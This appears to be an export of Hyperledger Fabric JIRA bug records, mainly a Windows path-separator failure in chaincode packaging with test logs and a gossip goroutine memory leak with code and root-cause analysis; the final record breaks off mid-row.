Peer lifecycle chaincode package fails on Windows,FAB-17288,43776,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,lehors,lehors,lehors,19/Dec/19 9:52 PM,10/Jan/20 3:23 AM,28/Oct/23 3:09 AM,10/Jan/20 3:23 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"The chaincode packaging code doesn't work on Windows:

$ peer lifecycle chaincode package fabcar.tar.gz --path ../chaincode/fabcar/go/ --lang golang --label fabcar_1 Error: failed to normalize chaincode path: failed to unmarshal output from 'go list': invalid character 'U' in string escape code

The above problem comes from the fact that ""go list"" on Window returns files with backslashes on which json.Unmarshal choke.

But the problem goes beyond, because the tar file that gets created (once past the above) contains a filenames with a mix of / and \:

 
{code:java}
$ tar tf code.tar.gz:
src/
src\\vendor/
src\\vendor\\github.com/
src\\vendor\\github.com\\PuerkitoBio/
src\\vendor\\github.com\\PuerkitoBio\\purell/
src\\vendor\\github.com\\PuerkitoBio\\urlesc/
src\\vendor\\github.com\\go-openapi/
src\\vendor\\github.com\\go-openapi\\jsonpointer/
src\\vendor\\github.com\\go-openapi\\jsonreference/
src\\vendor\\github.com\\go-openapi\\spec/
src\\vendor\\github.com\\go-openapi\\swag/
 ...
src\\vendor\\gopkg.in\\yaml.v2\\yaml.go
src\\vendor\\gopkg.in\\yaml.v2\\yamlh.go
src\\vendor\\gopkg.in\\yaml.v2\\yamlprivateh.go
src\\vendor\\modules.txt
{code}
 

Which then leads to a failure by the peer to install the chaincode.

 

 ",,anhngo,Gigamuse,lehors,sykesm,ymlbright,,,,,,,,,,,,,,,,,FAB-17315,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zly",,,,Unset,Unset,,"$ cd fabric-samples/test-network
$ ./network.sh up createChannel
$ ./network.sh deployCC
",,Unset,,,,,,Unset,,Unset,,(Please add usage information),anhngo,Gigamuse,lehors,sykesm,ymlbright,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/Dec/19 7:47 PM;lehors;Go test also fails:

 
{code:java}
$ cd core/chaincode/platforms/golang
$ go test
--- FAIL: Test_gopathDependencyPackageInfo (4.82s)
 --- FAIL: Test_gopathDependencyPackageInfo/TestPeer (2.96s)
 list_test.go:23:
 Error Trace: list_test.go:23
 Error: Received unexpected error:
 invalid character 'U' in string escape code
 Test: Test_gopathDependencyPackageInfo/TestPeer
 Messages: failed to get dependencyPackageInfo
 list_test.go:32:
 Error Trace: list_test.go:32
 Error: Should be true
 Test: Test_gopathDependencyPackageInfo/TestPeer
 Messages: expected to find the peer package
--- FAIL: Test_listModuleInfo (2.65s)
 list_test.go:87:
 Error Trace: list_test.go:87
 Error: Received unexpected error:
 invalid character 'U' in string escape code
 failed to unmarshal output from 'go list'
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.listModuleInfo
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/list.go:144
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.Test_listModuleInfo
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/list_test.go:86
 testing.tRunner
 c:/go/src/testing/testing.go:909
 runtime.goexit
 c:/go/src/runtime/asm_amd64.s:1357
 Test: Test_listModuleInfo
 Messages: failed to get module info
 list_test.go:95:
 Error Trace: list_test.go:95
 Error: Not equal:
 expected: &golang.ModuleInfo{Dir:""C:\\Users\\lehors\\Projects\\Go\\src\\github.com\\hyperledger\\fabric\\core\\chaincode\\platforms\\golang\\testdata\\ccmodule"", ImportPath:""ccmodule"", ModulePath:""ccmodule"", GoMod:""C:\\Users\\lehors\\Projects\\Go\\src\\github.com\\hyperledger\\fabric\\core\\chaincode\\platforms\\golang\\testdata\\ccmodule\\go.mod""}
 actual : (*golang.ModuleInfo)(nil)
Diff:
 --- Expected
 +++ Actual
 @@ -1,7 +1,2 @@
 -(*golang.ModuleInfo)({
 - Dir: (string) (len=111) ""C:\\Users\\lehors\\Projects\\Go\\src\\github.com\\hyperledger\\fabric\\core\\chaincode\\platforms\\golang\\testdata\\ccmodule"",
 - ImportPath: (string) (len=8) ""ccmodule"",
 - ModulePath: (string) (len=8) ""ccmodule"",
 - GoMod: (string) (len=118) ""C:\\Users\\lehors\\Projects\\Go\\src\\github.com\\hyperledger\\fabric\\core\\chaincode\\platforms\\golang\\testdata\\ccmodule\\go.mod""
 -})
 +(*golang.ModuleInfo)(<nil>)
Test: Test_listModuleInfo
 list_test.go:101:
 Error Trace: list_test.go:101
 Error: Received unexpected error:
 invalid character 'U' in string escape code
 failed to unmarshal output from 'go list'
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.listModuleInfo
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/list.go:144
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.Test_listModuleInfo
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/list_test.go:100
 testing.tRunner
 c:/go/src/testing/testing.go:909
 runtime.goexit
 c:/go/src/runtime/asm_amd64.s:1357
 Test: Test_listModuleInfo
 Messages: failed to get module info
 list_test.go:109:
 Error Trace: list_test.go:109
 Error: Not equal:
 expected: &golang.ModuleInfo{Dir:""C:\\Users\\lehors\\Projects\\Go\\src\\github.com\\hyperledger\\fabric\\core\\chaincode\\platforms\\golang\\testdata\\ccmodule"", ImportPath:""ccmodule/nested"", ModulePath:""ccmodule"", GoMod:""C:\\Users\\lehors\\Projects\\Go\\src\\github.com\\hyperledger\\fabric\\core\\chaincode\\platforms\\golang\\testdata\\ccmodule\\go.mod""}
 actual : (*golang.ModuleInfo)(nil)
Diff:
 --- Expected
 +++ Actual
 @@ -1,7 +1,2 @@
 -(*golang.ModuleInfo)({
 - Dir: (string) (len=111) ""C:\\Users\\lehors\\Projects\\Go\\src\\github.com\\hyperledger\\fabric\\core\\chaincode\\platforms\\golang\\testdata\\ccmodule"",
 - ImportPath: (string) (len=15) ""ccmodule/nested"",
 - ModulePath: (string) (len=8) ""ccmodule"",
 - GoMod: (string) (len=118) ""C:\\Users\\lehors\\Projects\\Go\\src\\github.com\\hyperledger\\fabric\\core\\chaincode\\platforms\\golang\\testdata\\ccmodule\\go.mod""
 -})
 +(*golang.ModuleInfo)(<nil>)
Test: Test_listModuleInfo
--- FAIL: TestNormalizePath (2.14s)
 --- FAIL: TestNormalizePath/1 (1.72s)
 platform_test.go:110:
 Error Trace: platform_test.go:110
 Error: Received unexpected error:
 invalid character 'U' in string escape code
 failed to unmarshal output from 'go list'
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.listModuleInfo
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/list.go:144
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.moduleInfo
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:344
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.(*Platform).NormalizePath
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:58
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.TestNormalizePath.func1
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform_test.go:109
 testing.tRunner
 c:/go/src/testing/testing.go:909
 runtime.goexit
 c:/go/src/runtime/asm_amd64.s:1357
 Test: TestNormalizePath/1
 Messages: normalize path failed
 platform_test.go:111:
 Error Trace: platform_test.go:111
 Error: Not equal:
 expected: ""ccmodule""
 actual : """"
Diff:
 --- Expected
 +++ Actual
 @@ -1 +1 @@
 -ccmodule
 +
 Test: TestNormalizePath/1
 Messages: want result ccmodule got
--- FAIL: Test_findSource (0.05s)
 --- FAIL: Test_findSource/Gopath (0.03s)
 require.go:794:
 Error Trace: platform_test.go:178
 Error: Received unexpected error:
 metadata file path must begin with META-INF/statedb, found: META-INF\statedb\couchdb\indexes\
 walk failed
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.findSource
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:450
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.Test_findSource.func1
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform_test.go:173
 testing.tRunner
 c:/go/src/testing/testing.go:909
 runtime.goexit
 c:/go/src/runtime/asm_amd64.s:1357
 Test: Test_findSource/Gopath
 Messages: failed to find source
 --- FAIL: Test_findSource/Module (0.02s)
 require.go:794:
 Error Trace: platform_test.go:191
 Error: Received unexpected error:
 metadata file path must begin with META-INF/statedb, found: META-INF\statedb\couchdb\indexes\
 walk failed
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.findSource
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:450
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.Test_findSource.func2
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform_test.go:185
 testing.tRunner
 c:/go/src/testing/testing.go:909
 runtime.goexit
 c:/go/src/runtime/asm_amd64.s:1357
 Test: Test_findSource/Module
 Messages: failed to find source
 --- FAIL: Test_findSource/NonExistent (0.00s)
 platform_test.go:205:
 Error Trace: platform_test.go:205
 Error: ""walk failed: Lstat : The system cannot find the path specified."" does not contain ""no such file or directory""
 Test: Test_findSource/NonExistent
--- FAIL: TestGopathDeploymentPayload (0.92s)
 platform_test.go:236:
 Error Trace: platform_test.go:236
 Error: Received unexpected error:
 metadata file path must begin with META-INF/statedb, found: META-INF\statedb\couchdb\indexes\
 walk failed
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.findSource
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:450
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.(*Platform).GetDeploymentPayload
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:121
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.TestGopathDeploymentPayload
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform_test.go:235
 testing.tRunner
 c:/go/src/testing/testing.go:909
 runtime.goexit
 c:/go/src/runtime/asm_amd64.s:1357
 Test: TestGopathDeploymentPayload
 require.go:794:
 Error Trace: platform_test.go:214
 platform_test.go:238
 Error: Received unexpected error:
 EOF
 Test: TestGopathDeploymentPayload
 Messages: failed to create new gzip reader
--- FAIL: TestModuleDeploymentPayload (3.57s)
 --- FAIL: TestModuleDeploymentPayload/TopLevel (1.76s)
 platform_test.go:247:
 Error Trace: platform_test.go:247
 Error: Received unexpected error:
 invalid character 'U' in string escape code
 failed to unmarshal output from 'go list'
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.listModuleInfo
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/list.go:144
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.moduleInfo
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:344
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.DescribeCode
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:261
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.(*Platform).GetDeploymentPayload
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:116
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.TestModuleDeploymentPayload.func1
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform_test.go:246
 testing.tRunner
 c:/go/src/testing/testing.go:909
 runtime.goexit
 c:/go/src/runtime/asm_amd64.s:1357
 Test: TestModuleDeploymentPayload/TopLevel
 require.go:794:
 Error Trace: platform_test.go:214
 platform_test.go:248
 Error: Received unexpected error:
 EOF
 Test: TestModuleDeploymentPayload/TopLevel
 Messages: failed to create new gzip reader
 --- FAIL: TestModuleDeploymentPayload/NestedPackage (1.81s)
 platform_test.go:262:
 Error Trace: platform_test.go:262
 Error: Received unexpected error:
 invalid character 'U' in string escape code
 failed to unmarshal output from 'go list'
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.listModuleInfo
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/list.go:144
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.moduleInfo
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:344
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.DescribeCode
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:261
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.(*Platform).GetDeploymentPayload
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:116
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.TestModuleDeploymentPayload.func2
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform_test.go:261
 testing.tRunner
 c:/go/src/testing/testing.go:909
 runtime.goexit
 c:/go/src/runtime/asm_amd64.s:1357
 Test: TestModuleDeploymentPayload/NestedPackage
 require.go:794:
 Error Trace: platform_test.go:214
 platform_test.go:263
 Error: Received unexpected error:
 EOF
 Test: TestModuleDeploymentPayload/NestedPackage
 Messages: failed to create new gzip reader
--- FAIL: TestGetDeploymentPayload (9.01s)
 platform_test.go:320:
 Error Trace: platform_test.go:320
 Error: Received unexpected error:
 metadata file path must begin with META-INF/statedb, found: META-INF\statedb\couchdb\indexes\
 walk failed
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.findSource
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:450
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.(*Platform).GetDeploymentPayload
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:121
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.TestGetDeploymentPayload
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform_test.go:318
 testing.tRunner
 c:/go/src/testing/testing.go:909
 runtime.goexit
 c:/go/src/runtime/asm_amd64.s:1357
 Test: TestGetDeploymentPayload
 Messages: expected success for path: github.com/hyperledger/fabric/core/chaincode/platforms/golang/testdata/src/chaincodes/noop
 platform_test.go:320:
 Error Trace: platform_test.go:320
 Error: Received unexpected error:
 invalid character 'U' in string escape code
 Test: TestGetDeploymentPayload
 Messages: expected success for path: github.com/hyperledger/fabric/core/chaincode/platforms/golang/testdata/src/chaincodes/BadMetadataIgnoreHiddenFile
 platform_test.go:320:
 Error Trace: platform_test.go:320
 Error: Received unexpected error:
 invalid character 'U' in string escape code
 failed to unmarshal output from 'go list'
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.listModuleInfo
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/list.go:144
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.moduleInfo
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:344
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.DescribeCode
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:261
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.(*Platform).GetDeploymentPayload
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:116
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.TestGetDeploymentPayload
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform_test.go:318
 testing.tRunner
 c:/go/src/testing/testing.go:909
 runtime.goexit
 c:/go/src/runtime/asm_amd64.s:1357
 Test: TestGetDeploymentPayload
 Messages: expected success for path: testdata/ccmodule
--- FAIL: TestDescribeCode (3.45s)
 --- FAIL: TestDescribeCode/TopLevelModulePackage (1.73s)
 platform_test.go:435:
 Error Trace: platform_test.go:435
 Error: Received unexpected error:
 invalid character 'U' in string escape code
 failed to unmarshal output from 'go list'
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.listModuleInfo
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/list.go:144
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.moduleInfo
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:344
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.DescribeCode
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:261
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.TestDescribeCode.func1
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform_test.go:434
 testing.tRunner
 c:/go/src/testing/testing.go:909
 runtime.goexit
 c:/go/src/runtime/asm_amd64.s:1357
 Test: TestDescribeCode/TopLevelModulePackage
 platform_test.go:442:
 Error Trace: platform_test.go:442
 Error: Not equal:
 expected: &golang.CodeDescriptor{Source:""C:\\Users\\lehors\\Projects\\Go\\src\\github.com\\hyperledger\\fabric\\core\\chaincode\\platforms\\golang\\testdata\\ccmodule"", MetadataRoot:""C:\\Users\\lehors\\Projects\\Go\\src\\github.com\\hyperledger\\fabric\\core\\chaincode\\platforms\\golang\\testdata\\ccmodule\\META-INF"", Path:""ccmodule"", Module:true}
 actual : (*golang.CodeDescriptor)(nil)
Diff:
 --- Expected
 +++ Actual
 @@ -1,7 +1,2 @@
 -(*golang.CodeDescriptor)({
 - Source: (string) (len=111) ""C:\\Users\\lehors\\Projects\\Go\\src\\github.com\\hyperledger\\fabric\\core\\chaincode\\platforms\\golang\\testdata\\ccmodule"",
 - MetadataRoot: (string) (len=120) ""C:\\Users\\lehors\\Projects\\Go\\src\\github.com\\hyperledger\\fabric\\core\\chaincode\\platforms\\golang\\testdata\\ccmodule\\META-INF"",
 - Path: (string) (len=8) ""ccmodule"",
 - Module: (bool) true
 -})
 +(*golang.CodeDescriptor)(<nil>)
Test: TestDescribeCode/TopLevelModulePackage
 --- FAIL: TestDescribeCode/NestedModulePackage (1.72s)
 platform_test.go:447:
 Error Trace: platform_test.go:447
 Error: Received unexpected error:
 invalid character 'U' in string escape code
 failed to unmarshal output from 'go list'
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.listModuleInfo
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/list.go:144
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.moduleInfo
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:344
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.DescribeCode
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform.go:261
 github.com/hyperledger/fabric/core/chaincode/platforms/golang.TestDescribeCode.func2
 C:/Users/lehors/Projects/Go/src/github.com/hyperledger/fabric/core/chaincode/platforms/golang/platform_test.go:446
 testing.tRunner
 c:/go/src/testing/testing.go:909
 runtime.goexit
 c:/go/src/runtime/asm_amd64.s:1357
 Test: TestDescribeCode/NestedModulePackage
 platform_test.go:454:
 Error Trace: platform_test.go:454
 Error: Not equal:
 expected: &golang.CodeDescriptor{Source:""C:\\Users\\lehors\\Projects\\Go\\src\\github.com\\hyperledger\\fabric\\core\\chaincode\\platforms\\golang\\testdata\\ccmodule"", MetadataRoot:""C:\\Users\\lehors\\Projects\\Go\\src\\github.com\\hyperledger\\fabric\\core\\chaincode\\platforms\\golang\\testdata\\ccmodule\\nested\\META-INF"", Path:""ccmodule/nested"", Module:true}
 actual : (*golang.CodeDescriptor)(nil)
Diff:
 --- Expected
 +++ Actual
 @@ -1,7 +1,2 @@
 -(*golang.CodeDescriptor)({
 - Source: (string) (len=111) ""C:\\Users\\lehors\\Projects\\Go\\src\\github.com\\hyperledger\\fabric\\core\\chaincode\\platforms\\golang\\testdata\\ccmodule"",
 - MetadataRoot: (string) (len=127) ""C:\\Users\\lehors\\Projects\\Go\\src\\github.com\\hyperledger\\fabric\\core\\chaincode\\platforms\\golang\\testdata\\ccmodule\\nested\\META-INF"",
 - Path: (string) (len=15) ""ccmodule/nested"",
 - Module: (bool) true
 -})
 +(*golang.CodeDescriptor)(<nil>)
Test: TestDescribeCode/NestedModulePackage
FAIL
exit status 1
FAIL github.com/hyperledger/fabric/core/chaincode/platforms/golang 32.245s
{code}
 ;;;","21/Dec/19 3:30 AM;lehors;It's worth noting that although the code path is different the same is true for all cc languages: go, node/javascript, and java. Indeed, while the command succeeds to produce a tarball for node and java, the tar file contains filepaths with backslashes that makes it unsuitable for chaincode install.

 ;;;","02/Jan/20 12:33 PM;Gigamuse;Same results as above except for 'h' character instead of 'U':

failed to unmarshal output from 'go list': invalid character 'h' in string escape code;;;","03/Jan/20 1:55 AM;lehors;[~Gigamuse], I submitted a PR to fix this, if you could test it and confirm that it works for you that'd be great!

https://github.com/hyperledger/fabric/pull/440;;;","03/Jan/20 12:49 PM;Gigamuse;Having no previous experience in using github (although a member for a while), I have spent considerable time getting my head around what to actually do to incorporate and test your changes. I have read your changes and those by sykesm in each file, noted the name of each and can understand the code. Can't find these files nor how to get them using git commands. Tried a few but may have inadvertently 'committed' some files. My sincere apologies about this but would love to test the changes! I do want to learn and use 'fabric' as it seems to have all the potential requirements for the network I am building (see [https://gallipolidawn.com.au/?page=software|https://gallipolidawn.com.au/?page=software)] ).;;;","08/Jan/20 3:20 AM;sykesm;sykesm: https://github.com/hyperledger/fabric/pull/458
lehors: https://github.com/hyperledger/fabric/pull/440;;;","08/Jan/20 3:55 AM;lehors;As stated on github I'm happy to withdraw #440 in favor of #458 which although not smaller is definitely better.

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
A memory leak in gossip/comm,FAB-17289,43781,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,shitaibin,shitaibin,shitaibin,20/Dec/19 4:56 PM,24/Jan/20 6:36 AM,28/Oct/23 3:09 AM,23/Dec/19 1:30 AM,v1.4.0,v1.4.1,v1.4.2,v1.4.3,v1.4.4,,,,,v1.4.5,,,,,,,,,,,,,0,,,,,,"h2. Problem

 

After each stress test, the memory occupied by each peer is increased compared to the memory occupied after the last performance test result:

 

!image-2019-12-20-15-44-42-806.png!

Each peak in the above figure is a stress test. After each test, the memory of peer1.org1 and peer1.org2 increases significantly.

Before the fourth stress test, the heap profile on peer1.org1 was obtained, as follows:

!http://192.168.9.251/hyperledger/fabric/uploads/621c4f0475aebe7ea0e1878531dabd1a/image-20191219091104570.png!

(clear version at attachment)

 

!http://192.168.9.251/hyperledger/fabric/uploads/7ab0ccde050f9f937d66f964d69305dc/image.png!

protobuf occupies more than 500MB of memory and is related to `readFromStream`.

After analyzing the goroutine profile, `readFromStream` has 17 goroutines, but its caller` serviceConnection` has only 3, indicating that a goroutine leak may have occurred. The following two pictures are evidence:

!http://192.168.9.251/hyperledger/fabric/uploads/e74c70aedd74942291ea32614b869eb4/image-20191219091155441.png!    !http://192.168.9.251/hyperledger/fabric/uploads/b77f3ad41073ecb3d505b77778cbd9f5/image-20191219091256371.png!

 

In addition, the following figure shows that the goroutine of a `readFromStream` is blocked on line 376, which has been blocked for 1118 minutes.

  !http://192.168.9.251/hyperledger/fabric/uploads/2343cb13819b5eb7dd51e5aa7413ac31/image-20191219091620959.png!

The 4th stress test was performed to confirm whether this is the problem. From the following two pictures, we can know that the number of `readFromStream` has increased to 23, while the` serviceConnection` is still only 3:

  !http://192.168.9.251/hyperledger/fabric/uploads/0a9884fad272a134edc97fd143b678c6/image-20191219104814380.png!

  !http://192.168.9.251/hyperledger/fabric/uploads/74dee3836c8b1b14c49d1f7871c70d33/image-20191219104904321.png!

It was confirmed that this was a goroutine leak, which caused a memory leak.
h2. Root cause

`serviceConnection` will create 2 goroutines:` readFromStream` and `writeToStream`, read data from` <-conn.stopChan`, and write data to `<-conn.stopChan`, which will not let` readFromStream`, because `readFromStream` does not read` <-conn.stopChan`, but reads from the `quit` channel, but` serviceConnection` does not write data to `quit`, which causes` readFromStream` not to exit when `serviceConnection` exits.

 
{code:java}
func (conn *connection) serviceConnection() error {
   errChan := make(chan error, 1)
   msgChan := make(chan *proto.SignedGossipMessage, conn.recvBuffSize)
   quit := make(chan struct{})
   // Call stream.Recv() asynchronously in readFromStream(),
   // and wait for either the Recv() call to end,
   // or a signal to close the connection, which exits
   // the method and makes the Recv() call to fail in the
   // readFromStream() method
   go conn.readFromStream(errChan, quit, msgChan)

   go conn.writeToStream()

   for !conn.toDie() {
      select {
      case stop := <-conn.stopChan:
         conn.logger.Debug(""Closing reading from stream"")
         conn.stopChan <- stop
         return nil
      case err := <-errChan:
         return err
      case msg := <-msgChan:
         conn.handler(msg)
      }
   }
   return nil
}

func (conn *connection) readFromStream(errChan chan error, quit chan struct{}, msgChan chan *proto.SignedGossipMessage) {
   for !conn.toDie() {
      stream := conn.getStream()
      if stream == nil {
         conn.logger.Error(conn.pkiID, ""Stream is nil, aborting!"")
         errChan <- fmt.Errorf(""Stream is nil"")
         return
      }
      envelope, err := stream.Recv()
      if conn.toDie() {
         conn.logger.Debug(conn.pkiID, ""canceling read because closing"")
         return
      }
      if err != nil {
         errChan <- err
         conn.logger.Debugf(""Got error, aborting: %v"", err)
         return
      }
      conn.metrics.ReceivedMessages.Add(1)
      msg, err := envelope.ToGossipMessage()
      if err != nil {
         errChan <- err
         conn.logger.Warningf(""Got error, aborting: %v"", err)
      }
      select {  // <---------- block here
      case msgChan <- msg:
      case <-quit:
         return
      }
   }
}
{code}
h2.  Fix

Although `serviceConnection` writes data to` quit`, which can cause `readFromStream` to exit, this is not a good way.

The best way is to close `conn.stopChan`, so that any goroutine that reads` conn.stopChan` will exit without the need for each goroutine to read data from `conn.stopChan`, and write another data to notify other goroutines drop out.

 

It already fixed in fabric 2.0. Charry picking some commits can fix it, but will change a lot code for these commit also modified some other codes. 

 

If needs minor change, see this PR in github.",,denyeart,lmars,shitaibin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Dec/19 4:44 PM;shitaibin;image-2019-12-20-15-44-42-806.png;https://jira.hyperledger.org/secure/attachment/18045/image-2019-12-20-15-44-42-806.png","20/Dec/19 4:55 PM;shitaibin;pprof.peer.alloc_objects.alloc_space.inuse_objects.inuse_space.001.pb.gz;https://jira.hyperledger.org/secure/attachment/18044/pprof.peer.alloc_objects.alloc_space.inuse_objects.inuse_space.001.pb.gz",,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016r7:",,,,Unset,Unset,,Stress test once and once again,,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,lmars,shitaibin,,,,,,,,,,,,release-1.4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Jan/20 6:36 AM;denyeart;Issues does not apply to master (v2.0), fix was only required in release-1.4.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update Nexus URL's to point to Artifactory in Fabric-Test,FAB-17290,43784,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,btl5037,btl5037,20/Dec/19 7:45 PM,19/Apr/20 1:23 PM,28/Oct/23 3:09 AM,19/Apr/20 1:23 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016rv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage 